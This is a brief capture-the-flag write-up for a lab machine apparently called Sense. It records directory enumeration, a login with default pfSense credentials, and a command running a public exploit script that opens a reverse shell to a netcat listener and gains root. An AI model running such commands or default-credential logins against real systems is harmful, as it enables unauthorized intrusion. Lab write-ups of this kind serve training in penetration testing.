# ⛎ sense

## Enumeration

Only web ports open and login page running on port 443

did gobuster -Found system-users.txt

found a username rohit and default password which is pfsense

## Exploit

We enter as admin

we see pfsense version as 2.1.3&#x20;

then we use the exploit with command and a nc running on 4444

```
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.59 --lport 4444 --username rohit --password pfsense
```

Gained  A ROOT shell
